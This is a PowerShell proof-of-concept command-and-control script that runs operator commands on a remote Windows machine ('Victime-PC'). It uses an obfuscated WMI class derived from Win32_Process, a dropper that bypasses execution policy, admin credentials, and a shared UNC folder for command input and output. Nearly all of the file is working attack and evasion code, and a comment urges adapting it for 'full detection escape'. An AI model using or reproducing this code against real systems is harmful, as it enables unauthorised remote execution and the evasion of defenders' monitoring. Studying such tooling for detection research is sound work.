<#
.SYNOPSIS
	PowerShell C2C PoC (WMI based) for defenses mechanism and blue team evasion using randomly generated and obfucated PowerShell derivated Class through multi-staged payload.

.NOTES
	File Name  : c2c.ps1
	Author     : J.M Bourbon 
	Contact	   : mail.bourbon@gmail.com - @kmkz_security
#>

Do {
    Clear-Host

    # UNC folder's cleaning:
    $Out="\\Vboxsvr\shared\BSIDESIE\*.lol"
    $Cmd=  "\\Vboxsvr\shared\BSIDESIE\cmd.in.txt"
   
    if(Test-Path -Path $Out){ Remove-Item $Out }
    if(Test-Path -Path $Cmd){ Remove-Item $Cmd }

    # Prepare the command to execute remotely through UNC path (or WebDav):
    $Exit="N"
    Write-Host "`n`n[$Target] shell#:  " -NoNewline -ForegroundColor yellow 
    $NewCmd = Read-Host

    if ($NewCmd -eq "exit"){
        if(Test-Path -Path $Out){ Remove-Item $Out }
        if(Test-Path -Path $Cmd){ Remove-Item $Cmd }
        Clear-Host "`n Ok thx bye ;)`n"
        exit 
    }

    Add-Content "\\Vboxsvr\shared\BSIDESIE\cmd.in.txt" $NewCmd


    ## Stage 1 (payload delivery/dropper):
    #  Payload arguments:
    Write-Host "`n`n Stage 1 initilization... " -NoNewline
    $Stage2UncPath="\\Vboxsvr\shared\BSIDESIE\V1\class-derivation.ps1"
    $Dropper = "PowErSheLl -eXecUtiOnpOliCY BypAsS -nOp -fILe $Stage2UncPath"
    $Target  = "Victime-PC"

    # Stage2 payload:
    Write-Host "[DONE]`n`n Stage 2 initilization... " -NoNewline
 
    if(! (Test-Path -Path $Stage2UncPath)){ 
        Write-Host "[FAILED]`n`nExiting!`n" -ForegroundColor red
        exit 
    }
    $zNrF = -jOin[regex]::MaTcHeS('sSeCorp_23nIw:2VmIc/tOoR/',".",'RightToLeft')
    $CoFtfEgvsJ = [wMicLaSs]$zNrF
    $YepTa = "pRoc"+"eSs"
    $PoDtbeF4Dp= "mY"+"Evi"+"l"+$Yepa
    $N = $CoFtfEgvsJ.dEriVe($PoDtbeF4Dp)
    $N.pUt()  | out-null

    Write-Host "[DONE]`n`n Stage 3 initilization... [DONE]"
    Write-Host "`n`n Delivering payload on remote target..." -NoNewline -ForegroundColor Yellow

    # This part (our stage 1 execution) is catched 'cause invoke-wmimethod do not apply class derivation and use "win32_Process" on target side.
    # Class derivation is then applied on attacker's station here.
    # >> Should be adapted for full detection escape 
    iNvokE-wmIMeThOd $PoDtbeF4Dp -NaMe CrEaTe -arGumEntlIst  $Dropper  -Impersonation 3 -Credential WORKGROUP\admin -ComputerName $Target | out-null
    Write-Host "[PWNED!]`n" -ForegroundColor red 
    
    For ($i=3; $i -ge 0; $i–-) {  
        Write-Progress -Activity "Executing stage 3" -SecondsRemaining $i
        sleep(0.6)
    }
    Write-Progress -Activity "Executing stage 3" -Completed

    # Once executed, print the command output stored on UNC share:
    $Out="\\Vboxsvr\shared\BSIDESIE\*.lol"
    Write-Host "`n`n[$Target] shell#:  " -NoNewline -ForegroundColor yellow 
    Get-Content $Out

    $Exit = Read-Host "`n Do you want to continue? (Y/N)"

} # Exiting PoC, that's enough!
while ($Exit -ne "N")
    Clear-Host
    "`n Ok thx bye ;)`n"